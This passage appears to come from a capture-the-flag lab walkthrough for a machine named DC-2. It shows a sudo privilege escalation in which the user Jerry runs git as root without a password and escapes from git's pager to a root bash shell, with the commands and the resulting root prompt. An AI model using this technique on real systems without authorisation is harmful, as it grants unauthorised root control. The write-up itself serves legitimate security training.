## Privilege Escalation

### Sudo Misconfiguration — git

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/git
```

Jerry can run `git` as root without a password. Using the [GTFOBins](https://gtfobins.github.io/gtfobins/git/) technique:

```bash
sudo git -p help config
# When the pager opens, type:
!/bin/bash
```

Root shell obtained! 🎉

```
root@DC-2:~#
```

